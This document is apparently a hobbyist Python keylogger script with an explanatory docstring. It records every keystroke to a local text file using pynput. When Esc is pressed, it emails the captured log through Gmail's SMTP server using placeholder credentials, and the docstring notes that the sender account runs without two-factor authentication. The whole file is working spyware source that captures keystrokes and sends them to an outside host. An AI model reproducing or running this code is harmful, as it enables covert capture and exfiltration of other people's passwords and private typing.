'''
Keyloggers are programs that capture your key strokes. They can be used to keep logs of everything you press
    on the keyboard and can be used for malicious purposes, i.e.: spyware, stealing login credentials.

Current keyloggers have lots of functionalities. They record and display the exact date and time of each keystroke,
    on which application the keystrokes were entered, easy-to-read logs, etc.

This program is simply a basic keylogger with limited functionality, which are to:
-> Capture and save your keystrokes to a "keylogger.txt" file
-> Send the contents of the file to your email (sender email is gmail with no two-factor authentication)

To run: Open the file in terminal and enter "python keylogger.py".
To escape: Press Esc key to exit the keylogger.

Modules used:
-> smtplib (pre-installed on Python)
-> ssl (pre-installed on Python)
-> pynput (requires installation with "pip install pynput")
'''

# Defines an SMTP client session object to send mail to any internet machine with an SMTP or ESMTP listener daemon
import smtplib
# Provides access to TLS/SSL encryption and peer authentication facilities for network sockets
import ssl
# Allows the control and monitoring of input devices (mouse and keyboard)
from pynput import keyboard

# Replace user@domain.com with your email id (everywhere)
sender_mail = "user@domain.com"
# prefer using your own email id for receiver's as well.
# Replace user@domain.com with your email id (everywhere)
receiver_mail = "user@domain.com"
password = "passcode"              # Enter your Password here
port = 587
message = """From: user@domain.com
To: user@domain.com                         
Subject: KeyLogs
Text: Keylogs 
"""


def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)
        f.close()


def on_key_press(Key):
    try:
        if (Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif (Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif (Key == keyboard.Key.space):
            write(" ")
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))


def on_key_release(Key):
    # This stops the Listener/Keylogger.
    # You can use any key you like by replacing "esc" with the key of your choice
    if (Key == keyboard.Key.esc):
        return False


with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

with open("keylogger.txt", 'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()

context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail, password)
server.sendmail(sender_mail, receiver_mail, message)
print("Email Sent to ", sender_mail)
server.quit()
